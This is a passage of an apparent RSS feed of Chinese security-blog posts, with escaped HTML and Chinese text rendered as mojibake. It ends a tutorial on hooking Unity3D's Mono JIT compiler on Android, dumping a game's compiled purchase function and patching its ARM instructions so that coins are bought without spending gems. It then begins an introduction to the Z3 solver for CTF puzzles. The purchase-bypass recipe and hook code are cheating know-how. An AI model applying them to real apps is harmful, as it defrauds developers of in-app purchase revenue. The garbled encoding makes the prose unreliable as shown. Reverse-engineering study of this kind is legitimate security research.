å‡½æ•°ã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;æ¥ä¸‹æ¥åˆ†æçš„å…³é”®æ˜¯ mono_compile_method å‡½æ•°ï¼ŒçœŸæ­£çš„ç¼–è¯‘è¿‡ç¨‹å‘ç”Ÿåœ¨è¿™ä¸ªå‡½æ•°ä¸­ã€‚è¯¥å‡½æ•°ä¸æ˜¯å”¯ä¸€çš„ï¼Œå› ä¸º mono åŒæ—¶æ”¯æŒ AOTï¼ˆ ahead of time ï¼‰ç¼–è¯‘ï¼Œæœªæ¥ä¹Ÿå¯èƒ½æ·»åŠ å…¶ä»–åŠŸèƒ½ã€‚å› æ­¤è¿™ä¸ªå‡½æ•°è¿™é‡Œä¸ºä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œåœ¨ JIT ç¼–è¯‘ç¯å¢ƒä¸‹æ‰§è¡Œçš„æ˜¯ mono_jit_compile_method å‡½æ•°ã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;gpointer
mono_jit_compile_method (MonoMethod *method)
{
	MonoException *ex = NULL;
	gpointer code;

	code = mono_jit_compile_method_with_opt (method, mono_get_optimizations_for_method (method, default_opt), &amp;amp;ex);
	if (!code) {
		g_assert (ex);
		mono_raise_exception (ex);
	}

	return code;
}
&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;è¿™ä¸ªå‡½æ•°è°ƒç”¨äº† mono_jit_compile_method_with_opt å‡½æ•°åšå…·ä½“æ“ä½œï¼Œæ³¨æ„è¿™é‡Œè¿”å›çš„æ˜¯ gpointer æŒ‡é’ˆï¼Œå…¶å®è¿™ä¸ªæŒ‡é’ˆæŒ‡å‘çš„å°±æ˜¯ DLL è„šæœ¬æœ€ç»ˆç¼–è¯‘æˆæ±‡ç¼–æ‰€åœ¨çš„åœ°å€ï¼Œåç»­å¦‚æœæˆ‘ä»¬éœ€è¦ä¿®æ”¹ç”Ÿæˆçš„æ±‡ç¼–ä»£ç ï¼Œä¿®æ”¹è¿™ä¸ªæŒ‡é’ˆå³å¯ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬ç¨å¾®æ·±å…¥è·Ÿè¿›ä¸€äº›ã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;static gpointer
mono_jit_compile_method_with_opt (MonoMethod *method, guint32 opt, MonoException **ex)
{
	...
    target_domain = mono_get_root_domain ();
	info = lookup_method (target_domain, method); //å…ˆæŸ¥è¡¨åˆ¤æ–­æ˜¯å¦å·²ç»ç¼–è¯‘
	if (info) {
		/* We can&#39;t use a domain specific method in another domain */
		if (! ((domain != target_domain) &amp;amp;&amp;amp; !info-&amp;gt;domain_neutral)) {
			MonoVTable *vtable;
			MonoException *tmpEx;

			mono_jit_stats.methods_lookups++;
			vtable = mono_class_vtable (domain, method-&amp;gt;klass);
			g_assert (vtable);
			tmpEx = mono_runtime_class_init_full (vtable, ex == NULL);
			if (tmpEx) {
				*ex = tmpEx;
				return NULL;
			}
			return mono_create_ftnptr (target_domain, info-&amp;gt;code_start);
		}
	}

	code = mono_jit_compile_method_inner (method, target_domain, opt, ex);//å®é™…ç¼–è¯‘ç‚¹
	Â·Â·Â·
	p = mono_create_ftnptr (target_domain, code);
    Â·Â·Â·
	return p;
}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;è¿™é‡Œéšå»äº†ç¼–è¯‘ invoke å‡½æ•°çš„ä»£ç å’Œä¸€äº›ç»†ææœ«èŠ‚çš„ check ã€‚å¯ä»¥çœ‹åˆ°ï¼Œ mono_jit_compile_method_with_opt å‡½æ•°çš„ä¸»è¦æµç¨‹æ˜¯é¦–å…ˆæŸ¥è¡¨çœ‹å½“å‰è¦ç¼–è¯‘çš„å‡½æ•°æ˜¯å¦å·²ç»ç¼–è¯‘ï¼Œå¦‚æœå·²ç»ç¼–è¯‘ï¼Œåˆ™ç›´æ¥è¿”å›ç¼–è¯‘å¥½çš„ç»“æœï¼›å¦åˆ™ï¼Œè°ƒç”¨ mono_jit_compile_method_inner å‡½æ•°å®é™…ç¼–è¯‘å¹¶æ³¨å†Œåˆ° target_domain ä¸­ï¼Œéšåé€šè¿‡ mono_create_ftnptr å‡½æ•°è·å–å‡½æ•°æŒ‡é’ˆã€‚å› ä¸ºè¿™éƒ¨åˆ†ä»£ç æ˜¯å¤ç”¨çš„ï¼Œé™¤äº†é¦–æ¬¡åŠ è½½ DLL ä¹‹å¤–çš„ä¸€äº›æƒ…æ™¯ä¹Ÿä¼šè°ƒç”¨è¯¥å‡½æ•°ï¼Œå…¶ä¸­å­˜åœ¨ä¸€äº›å‡½æ•°å·²ç»ç¼–è¯‘çš„æƒ…å†µã€‚ mono_jit_compile_method_inner å‡½æ•°ä»¥ä¸‹æ˜¯ä¸€äº›ä¸æœºå™¨ç›¸å…³çš„å…·ä½“æœºå™¨ç ç”Ÿæˆè¿‡ç¨‹ï¼Œå¯¹è™šæ‹Ÿæœºæ„Ÿå…´è¶£çš„æœ‹å‹å¯ä»¥è¿›ä¸€æ­¥å­¦ä¹ ï¼Œè¿™é‡Œå°±ä¸ç»§ç»­æ·±ç©¶äº†ï¼Œç®€å•æŠŠæ•´ä¸ªè°ƒç”¨è¿‡ç¨‹æ•´ç†ä¸€ä¸‹ï¼š&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;graph TD;
start--&amp;gt;mono_precompile_assemblies
mono_precompile_assemblies--&amp;gt;|foreach|mono_precompile_assembly
mono_precompile_assembly--&amp;gt;|å‡½æ•°ä½“|mono_jit_compile_method
mono_precompile_assembly--&amp;gt;|invoke|mono_marshal_get_runtime_invoke
mono_marshal_get_runtime_invoke--&amp;gt;mono_jit_compile_method
mono_jit_compile_method--&amp;gt;mono_jit_compile_method_with_opt
mono_jit_compile_method_with_opt--&amp;gt;|å·²ç»ç¼–è¯‘è¿‡|mono_create_ftnptr
mono_jit_compile_method_with_opt--&amp;gt;|æ²¡æœ‰ç¼–è¯‘è¿‡|mono_jit_compile_method_inner
mono_jit_compile_method_inner--&amp;gt;mini_method_compile
mini_method_compile--&amp;gt;mono_codegen
mono_codegen--&amp;gt;mono_create_ftnptr
mono_create_ftnptr--&amp;gt;finish&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;è‡³æ­¤æˆ‘ä»¬çš„åˆ†æå®Œæˆäº†ï¼Œå°½ç®¡è™šæ‹Ÿæœºå¯ä»¥ä½¿ç”¨èŠ±æ ·ç¹å¤šçš„è¯­è¨€å¼€å‘ï¼Œä½†æ˜¯æœ€ç»ˆåœ¨æ‰§è¡Œå‰ä¸€éœ€è¦æ¢å¤æˆæœ¬åœ°æœºå™¨ç å»æ‰§è¡Œã€‚è¿™å°±ç»™äº†æˆ‘ä»¬ä¸‹ hook çš„æœºä¼šï¼Œä¸‹ä¸€èŠ‚ä»‹ç»é€šè¿‡ä¿®æ”¹ mono ç¼–è¯‘å‡ºæ¥çš„æ±‡ç¼–å‡½æ•°é€»è¾‘ï¼Œå®Œæˆå¯¹æ¸¸æˆæµç¨‹çš„åŠ¨æ€ä¿®æ”¹ã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0X03  é€šè¿‡ä¿®æ”¹è™šæ‹Ÿæœºç”Ÿæˆçš„æ±‡ç¼–æŒ‡ä»¤ä¿®æ”¹æ¸¸æˆé€»è¾‘&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;æ¥ä¸‹æ¥æˆ‘ä»¬å°è¯•åˆ©ç”¨å‰é¢ä¸¤èŠ‚ä»‹ç»çš„çŸ¥è¯†ï¼Œä¿®æ”¹æ¸¸æˆçš„æ‰§è¡Œé€»è¾‘.&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;private void MainButtonClicked()
{
	...
		case UI_ConfirmationPopup.ScreenType.BuyCoins:
		{
			int num = Tuning.ShopCoinPackagesPrices[this.coinIndex];
			int num2 = Tuning.ShopCoinPackages[this.coinIndex];
			if (UserProfile.Gems &amp;gt;= num)
			{
				UserProfile.Gold += num2;
				UserProfile.Gems -= num;
				this.purchasedAmount = num2;
				this.screenType = UI_ConfirmationPopup.ScreenType.CoinsPurchased;
				Events.Instance.UI_MARKET_PURCHASED();
				GeneralManager.Analytics.ReportGoldPurchased(this.coinIndex, num);
				this.CallItQuits();
			}
			else
			{
				this.DisableAssets(true);
				this.LaunchOutOfGems();
			}
			break;
		}
	...
}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;æˆ‘ä»¬é€‰æ‹© MainButtonClicked è¿™ä¸ªå‡½æ•°ä½œä¸ºç›®æ ‡ï¼Œå…¶ä¸­çš„è´­ä¹°é‡‘å¸åˆ†æ”¯ä¼šæ£€æµ‹å½“å‰é’»çŸ³æ•°é‡ï¼Œå¦‚æœæ•°é‡å¤Ÿåˆ™è¿›è¡Œè´­ä¹°ï¼Œå¦åˆ™ä¸è¿›è¡Œè´­ä¹°ã€‚åœ¨ mono_jit_compile_method_with_opt å‡½æ•°ä¸Šä¸‹é’©å­ï¼Œæ£€æŸ¥ç¬¬ä¸€ä¸ªå‚æ•° method çš„ name å­—æ®µæ˜¯å¦åŒ…å«â€œ MainButtonClicked â€ï¼Œåœ¨åŒ…å«è¿™ä¸ªå­—æ®µæ—¶ï¼Œå°† gpointer æŒ‡å‘çš„å‡½æ•° dump å‡ºæ¥ã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;	if(!strstr(name, &quot;MainButtonClicked&quot;)) return target(arg1, arg2, arg3);
	LOGE(&quot;find MainButtonClicked&quot;);
	void* funcptr = target(arg1, arg2, arg3);
	LOGE(&quot;function MainButtonClicked base is: %0lx&quot;, funcptr);
	int fd = open(&quot;/data/local/tmp/dump&quot;, O_WRONLY | O_CREAT);
	if(fd == -1){
		LOGE(&quot;open error: %s&quot;, strerror(errno));
		exit(-1);
	}
	if(write(fd, funcptr, 0x1000 * 0x1000) == -1){
		LOGE(&quot;write error: %s&quot;, strerror(errno));
		exit(-1);
	}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;å¦‚ä¸Šè¿°ä»£ç æ‰€ç¤ºï¼Œè¿™æ¬¡ hook åœ¨ mono_jit_compile_method_with_opt å‡½æ•°æ¯æ¬¡ç¼–è¯‘ C# å‡½æ•°ç‚¹è¿›è¡Œåˆ¤æ–­ï¼Œå½“è¢«ç¼–è¯‘çš„å‡½æ•°æ˜¯æˆ‘ä»¬çš„ç›®æ ‡ MainButtonClicked æ—¶ï¼Œå¯¹å†…å­˜è¿›è¡Œ dump ï¼Œå°†ç¼–è¯‘æˆæœºå™¨ç çš„ MainButtonClicked è¾“å‡ºå‡ºæ¥ï¼Œæ¥ä¸‹æ¥ï¼Œä½¿ç”¨ IDA å¯¹è¯¥å‡½æ•°è¿›è¡Œåˆ†æã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;åœ¨åŠ è½½è¯¥å‡½æ•°æ—¶éœ€è¦æ³¨æ„ï¼Œç”±äº dump å‡ºæ¥çš„æ˜¯éƒ¨åˆ†å†…å­˜ï¼Œä¸åƒæ ‡å‡†çš„ elf æ–‡ä»¶ä¸€æ ·æœ‰å„ç§é…ç½®èƒ½å¤ŸåŠ è½½ï¼Œè¯†åˆ«ä¸º binary file ï¼Œéœ€è¦æ‰‹åŠ¨æŒ‡å®šå¤„ç†å™¨æ¶æ„ï¼Œè¿™é‡Œæ˜¯ ARM ã€‚å¦å¤–éœ€è¦æŒ‡å®šç¡¬ç›˜æ–‡ä»¶åç§»å’Œç¨‹åºåœ¨å†…å­˜ä¸­åç§»çš„æ˜ å°„å…³ç³»ï¼Œæ³¨æ„ä¸Šè¾¹ä»£ç ä¸­ç¬¬å››è¡Œè¾“å‡ºäº†ç¨‹åºåœ¨å†…å­˜ä¸­çš„åœ°å€ï¼ŒIDA èƒ½å¤Ÿåˆ©ç”¨ file_offset+memory_base è®¡ç®—å‡ºç›¸å½“ä¸€éƒ¨åˆ†çš„è·³è½¬æŒ‡ä»¤çš„è·³è½¬åœ°å€ï¼ˆå½“ç„¶ï¼Œç”±äºæˆ‘ä»¬åª dump äº†å¾ˆå°ä¸€éƒ¨åˆ†å†…å­˜ï¼Œä»ç„¶æœ‰å¾ˆå¤šä¾èµ–ç›¸å¯¹åç§»å¯»å€çš„è·³è½¬ç›®æ ‡æ— æ³•æ¢å¤ï¼Œä½†å¯¹ç¨‹åºç»“æ„çš„åˆ†ææ— å¤ªå¤§å½±å“ï¼‰ã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;é€šè¿‡ IDA åŠ è½½åï¼Œå¯ä»¥çœ‹å‡ºå‡½æ•°æ˜æ˜¾æ˜¯ä¸€ä¸ª switch-case ç»“æ„ï¼š&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-18af552a8585f0802182b8d233b5501a_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;726&quot; data-rawheight=&quot;485&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;è¿™ä¸ªç»“æ„ä¸ MainButtonClicked å‡½æ•°åŸå§‹å½¢å¼ä¸€è‡´ï¼Œé€šè¿‡åˆ†æäºŒè€…å…³ç³»å¯ä»¥å®šä½åˆ°é‡‘å¸è´­ä¹°æ—¶ç‚¹å‡»ç¡®å®šæŒ‰é”®å¯¹åº”åˆ°çš„ case ï¼š&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;		case UI_ConfirmationPopup.ScreenType.BuyCoins:
		{
			int num = Tuning.ShopCoinPackagesPrices[this.coinIndex];
			int num2 = Tuning.ShopCoinPackages[this.coinIndex];
			if (UserProfile.Gems &amp;gt;= num)
			{
				UserProfile.Gold += num2;
				UserProfile.Gems -= num;
				this.purchasedAmount = num2;
				this.screenType = UI_ConfirmationPopup.ScreenType.CoinsPurchased;
				Events.Instance.UI_MARKET_PURCHASED();
				GeneralManager.Analytics.ReportGoldPurchased(this.coinIndex, num);
				this.CallItQuits();
			}
			else
			{
				this.DisableAssets(true);
				this.LaunchOutOfGems();
			}
			break;
		}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-cdc0d4b206e0401f62255f720f602fe9_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;574&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;é€”ä¸­çš„ä¸¤ä¸ªåˆ†æ”¯å°±æ˜¯ C# ä¸­çš„ if-else ã€‚ç”±äºé«˜çº§è¯­è¨€æ•°æ®ç»“æ„æ¯”è¾ƒå¤æ‚ï¼Œååº”åœ¨æœºå™¨ç å±‚é¢å–æ•°æ®æ¶‰åŠé—®é¢˜è¾ƒå¤šï¼Œå› æ­¤ä¿®æ”¹å–æ•°æ®æ¯”è¾ƒå›°éš¾ã€‚ä½†æ˜¯å¯ä»¥çœ‹åˆ°ï¼Œä¸Šé¢çš„ block ä¸­ R5 æ˜¯æœ€åå–å‡ºçš„å½“å‰å‰©ä½™å®çŸ³ï¼Œå½“ä¸å…¶è¿›è¡Œæ¯”è¾ƒä¹‹åï¼Œå¦‚æœå®çŸ³å……è¶³ï¼Œåˆ™ä¼šè·³è½¬åˆ°çº¢è‰²åˆ†æ”¯å¼€å§‹è´­ä¹°ï¼Œå¢åŠ é‡‘å¸æ‰£é™¤å®çŸ³ã€‚å› æ­¤åº”å½“ä¿®æ”¹çš„é€»è¾‘æ˜¯å›¾ä¸­ 1 å¤„ï¼Œé€šè¿‡ nopï¼ˆmov r0, r0ï¼‰æ‰è·³è½¬å¼ºåˆ¶æ‰§è¡Œè´­ä¹°æµç¨‹ã€‚ä¸ºäº†åœ¨ä¿®æ”¹é‡‘å¸çš„åŒæ—¶ä¸å‡å°‘å®çŸ³ï¼Œå°†2å¤„å®çŸ³è¿ç®—æ”¹ä¸º add r0 , r0 , r5 ã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;ç¡®å®šäº†ä¿®æ”¹ç‚¹ä¹‹åå°†ä¸Šè¿°ä¸¤æ¡å‘½ä»¤æ±‡ç¼–ï¼Œä½¿ç”¨ä¹‹å‰çš„ hook ç¨ä½œä¿®æ”¹ï¼Œå½“æ‰§è¡Œåˆ° MainButtonClicked ç¼–è¯‘æ—¶ä¿®æ”¹ç¨‹åºæœºå™¨ç ï¼ˆ mono å·²ç»å¾ˆè´´å¿ƒçš„ mprotect è¿‡äº†ï¼‰ï¼Œå®Œæˆå¯¹æ¸¸æˆçš„ä¿®æ”¹ï¼Œæ¥ä¸‹æ¥å°è¯•è´­ä¹°å®çŸ³ï¼Œå“‡ï¼Œå¥‡è¿¹å‘ç”Ÿäº†ã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0X04  åè®°&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;æœ¬æ–‡ä»ä¸€ä¸ªç®€å•å°æ¸¸æˆçš„ç ´è§£å‡ºå‘ï¼Œä»‹ç»äº† Unity3D å¼•æ“ä½¿ç”¨ mono è¿›è¡Œ C# JIT ç¼–è¯‘çš„æ€è·¯ï¼Œå¹¶è®¾è®¡äº†å®éªŒæ€§è´¨çš„ hook æ–¹æ¡ˆã€‚å…¶å®é’ˆå¯¹è¿™æ¬¾ç®€å•çš„å°æ¸¸æˆï¼Œæ›´ç®€å•çš„ç ´è§£æ–¹å¼è¿˜æœ‰å¾ˆå¤šç§ï¼Œç‰›åˆ€æ€é¸¡æ˜¯ä¸ºäº†ä»¥åæ›´å®¹æ˜“æ€ç‰›ã€‚å› ä¸ºåœ¨å®é™…çš„ç¯å¢ƒä¸­ï¼Œåˆ†ææ¸¸æˆé¢ä¸´ç€è¿‡åè°ƒè¯•ã€è„±å£³ã€å¯¹æŠ—å»ç¬¦å·ã€DLL è§£å¯†ç­‰å¤šé‡æŒ‘æˆ˜ã€‚é™äºç¯‡å¹…ä¸å¯èƒ½å¯¹è¿™äº›æŠ€æœ¯ä¸€ä¸€ä»‹ç»ï¼Œæ„Ÿå…´è¶£çš„æœ‹å‹å¯ä»¥è‡ªè¡Œç™¾åº¦/è°·æ­Œã€‚å¦å¤–ï¼Œç”±äºä½¿ç”¨äº† AOT æœºåˆ¶ï¼Œæ–‡ç« ä¸­ä»‹ç»çš„ hook æ€è·¯å¯èƒ½ä¼šæ›´é€‚ç”¨äº iOS ï¼Œæ¡ä»¶æ‰€é™æ²¡æœ‰å°è¯•ã€‚æ”»å‡»æ˜¯ä¸ºäº†æ›´å¥½çš„é˜²å¾¡ï¼Œä½¿ç”¨çš„å®ä¾‹ï¼Œä»‹ç»çš„å·¥å…·éƒ½ä¸ºäº†æ›´å¥½çš„è¯´æ˜æŠ€æœ¯æœ¬èº«ï¼Œè¯·ä¸è¦ç”¨è¿æ³•çš„ç›®çš„ã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;å‚è€ƒæ–‡çŒ®&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;[1]: &lt;a href=&quot;http://www.cnblogs.com/murongxiaopifu/p/4211964.html&quot;&gt;Monoä¸ºä½•èƒ½è·¨å¹³å°ï¼ŸèŠèŠCIL(MSIL) - æ…•å®¹å°åŒ¹å¤« - åšå®¢å›­&lt;/a&gt;	&quot;Monoä¸ºä½•èƒ½è·¨å¹³å°ï¼ŸèŠèŠCIL(MSIL)&quot;&lt;/p&gt;&lt;p&gt;[2]: &lt;a href=&quot;http://www.ecma-international.org/&quot;&gt;Welcome to Ecma International&lt;/a&gt;	&quot;EMCAå®˜ç½‘&quot;&lt;/p&gt;&lt;p&gt;[3]: &lt;a href=&quot;https://github.com/ele7enxxh/Android-Inline-Hook&quot;&gt;ele7enxxh/Android-Inline-Hook&lt;/a&gt;	&quot;Android Inline Hook&quot;&lt;/p&gt;&lt;p&gt;[4]: &lt;a href=&quot;https://github.com/mono/mono&quot;&gt;mono/mono&lt;/a&gt;	&quot;Mono Project on Github&quot;&lt;/p&gt;&lt;p&gt;[5]: &lt;a href=&quot;https://bbs.pediy.com/thread-141355.htm&quot;&gt;[åŸåˆ›]å‘ä¸ªAndroidå¹³å°ä¸Šçš„æ³¨å…¥ä»£ç -ã€Androidå®‰å…¨ã€-çœ‹é›ªå®‰å…¨è®ºå›&lt;/a&gt;	&quot;å¤æ²³å¤§å¤§libinject&quot;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>perhaps</author>
<guid isPermaLink="false">2017-11-07-30703785</guid>
<pubDate>Tue, 07 Nov 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>Z3ä¸€æŠŠæ¢­ï¼šç”¨çº¦æŸæ±‚è§£æå®šä¸€ç±»CTFé¢˜</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2017-10-29-30548907.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;Z3ä¸€æŠŠæ¢­ï¼šç”¨çº¦æŸæ±‚è§£æå®šä¸€ç±»CTFé¢˜&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/30548907&quot;&gt;åŸæ–‡&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-ab18970a5c5801d979023ff5ef808f23_r.png&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;Z3 ç®€ä»‹&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/Z3Prover/z3&quot;&gt;Z3&lt;/a&gt; æ˜¯ä¸€ä¸ªå¾®è½¯å‡ºå“çš„å¼€æºçº¦æŸæ±‚è§£å™¨ï¼Œèƒ½å¤Ÿè§£å†³å¾ˆå¤šç§æƒ…å†µä¸‹çš„ç»™å®šéƒ¨åˆ†çº¦æŸæ¡ä»¶å¯»æ±‚ä¸€ç»„æ»¡è¶³æ¡ä»¶çš„è§£çš„é—®é¢˜ï¼ˆå¯ä»¥ç®€å•ç†è§£ä¸ºè§£æ–¹ç¨‹çš„æ„Ÿè§‰ï¼Œè™½ç„¶è¿™ä¹ˆæ¯”å–»å…¶å®è¿˜å·®è·ç”šè¿œï¼Œè¯·å‹¿åæ§½ï¼‰ï¼ŒåŠŸèƒ½å¼ºå¤§ä¸”æ˜“äºä½¿ç”¨ï¼Œæœ¬æ–‡ä»¥è¿‘æœŸçš„ CTF é¢˜ä¸ºå®ä¾‹ï¼Œå‘å°šæœªæ¥è§¦è¿‡çº¦æŸæ±‚è§£å™¨çš„å°ä¼™ä¼´ä»¬ä»‹ç» Z3 åœ¨ CTF è§£é¢˜ä¸­çš„åº”ç”¨ã€‚&lt;/p&gt;&lt;p&gt;Z3 çº¦æŸæ±‚è§£å™¨æ˜¯é’ˆå¯¹ &lt;a href=&quot;https://en.wikipedia.org/wiki/Satisfiability_modulo_theories&quot;&gt;Satisfiability modulo theories Problem&lt;/a&gt; çš„ä¸€ç§é€šç”¨æ±‚è§£å™¨ã€‚æ‰€è°“ SMT é—®é¢˜ï¼Œåœ¨ Z3 ç¯å¢ƒä¸‹æ˜¯æŒ‡å…³äºç®—æœ¯ã€ä½è¿ç®—ã€æ•°ç»„ç­‰èƒŒæ™¯ç†è®ºçš„ä¸€é˜¶é€»è¾‘ç»„åˆå†³å®šæ€§é—®é¢˜ã€‚è™½ç„¶ Z3 åŠŸèƒ½å¼ºå¤§ï¼Œä½†æ˜¯ä»ç†è®ºä¸Šæ¥è¯´ï¼Œå¤§éƒ¨åˆ† SMT é—®é¢˜çš„æ—¶é—´å¤æ‚åº¦éƒ½è¿‡é«˜ï¼Œæ ¹æœ¬ä¸å¯èƒ½åœ¨æœ‰é™æ—¶é—´å†…è§£å†³ã€‚æ‰€ä»¥åƒä¸‡ä¸è¦æŠŠ Z3 æƒ³è±¡å¾—è¿‡äºä¸‡èƒ½ã€‚&lt;/p&gt;&lt;p&gt;Z3 åœ¨å·¥ä¸šåº”ç”¨ä¸­å®é™…ä¸Šå¸¸è§äºè½¯ä»¶éªŒè¯ã€ç¨‹åºåˆ†æç­‰ã€‚ç„¶è€Œç”±äºåŠŸèƒ½å®åœ¨å¼ºå¤§ï¼Œä¹Ÿè¢«ç”¨äºå¾ˆå¤šå…¶ä»–é¢†åŸŸã€‚CTF é¢†åŸŸæ¥è¯´ï¼Œèƒ½å¤Ÿç”¨çº¦æŸæ±‚è§£å™¨æå®šçš„é—®é¢˜å¸¸è§äºå¯†ç é¢˜ã€äºŒè¿›åˆ¶é€†å‘ã€ç¬¦å·æ‰§è¡Œã€Fuzzing æ¨¡ç³Šæµ‹è¯•ç­‰ã€‚æ­¤å¤–ï¼Œè‘—åçš„äºŒè¿›åˆ¶åˆ†ææ¡†æ¶ &lt;a href=&quot;http://angr.io/&quot;&gt;angr&lt;/a&gt; ä¹Ÿå†…ç½®äº†ä¸€ä¸ªä¿®æ”¹ç‰ˆçš„ Z3ã€‚&lt;/p&gt;&lt;p&gt;Z3 æœ¬èº«æä¾›ä¸€ä¸ªç±»ä¼¼äº Lisp çš„å†…ç½®è¯­è¨€ï¼Œä½†æ˜¯å®é™…ä½¿ç”¨ä¸­ï¼Œä¸€èˆ¬ä½¿ç”¨ Python Binding æ“ä½œä¼šæ¯”è¾ƒæ–¹ä¾¿ã€‚&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;http://z3prover.github.io/api/html/namespacez3py.html&quot;&gt;http://z3prover.github.io/api/html/namespacez3py.html&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://pypi.python.org/pypi/z3-solver/4.5.1.0&quot;&gt;https://pypi.python.org/pypi/z3-solver/4.5.1.0&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://ericpony.github.io/z3py-tutorial/guide-examples.htm&quot;&gt;https://ericpony.github.io/z3py-tutorial/guide-examples.htm&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;Z3 å…¥é—¨&lt;/h2&gt;&lt;p&gt;Z3 å†…ç½®äº†å¤šç§å˜é‡ç±»å‹ï¼ŒåŸºæœ¬èƒ½è¦†ç›–å¸¸è§è®¡ç®—æœºæ•°æ®ç»“æ„ã€‚åŒ…æ‹¬æ•´æ•°ã€æµ®ç‚¹æ•°ã€BitVectorã€æ•°ç»„ç­‰ã€‚&lt;/p&gt;&lt;p&gt;å…ˆæ¥ä¸€ä¸ªç®€å•çš„ä¾‹å­çœ‹ä¸€ä¸‹ Z3 èƒ½åšä»€ä¹ˆï¼š&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;from z3 import *

x = Int(&#39;x&#39;)
y = Int(&#39;y&#39;)
solve(x &amp;gt; 2, y &amp;lt; 10, x + 2*y == 7) &lt;/code&gt;&lt;p&gt;ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œå®šä¹‰äº†ä¸¤ä¸ªå˜é‡ï¼šx å’Œ yã€‚ç±»å‹ä¸º Intï¼ˆæ³¨æ„è¿™é‡Œçš„ Int å¯ä¸æ˜¯ C/C++ é‡Œé¢åŒ…å«ä¸Šä¸‹ç•Œçš„ intï¼ŒZ3 ä¸­çš„ Int å¯¹åº”çš„å°±æ˜¯æ•°å­¦ä¸­çš„æ•´æ•°ï¼ŒZ3 ä¸­çš„ BitVector æ‰å¯¹åº”åˆ° C/C++ ä¸­çš„ intï¼‰ã€‚&lt;/p&gt;&lt;p&gt;ç„¶åå°±è°ƒç”¨äº† &lt;code class=&quot;inline&quot;&gt;solve&lt;/code&gt; å‡½æ•°æ±‚è§£ä¸‰ä¸ªæ¡ä»¶ä¸‹çš„æ»¡è¶³æ¨¡å‹ï¼Œè¿™ä¸‰ä¸ªæ¡ä»¶åˆ†åˆ«æ˜¯ x å¤§äº 2ï¼Œy å°äº 10ï¼Œå¹¶ä¸” x åŠ  2 ä¸ª y ç­‰äº 7ã€‚&lt;/p&gt;&lt;p&gt;è¿è¡Œä¸€ä¸‹ç»“æœï¼š&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;(z3env) $ python example.py 
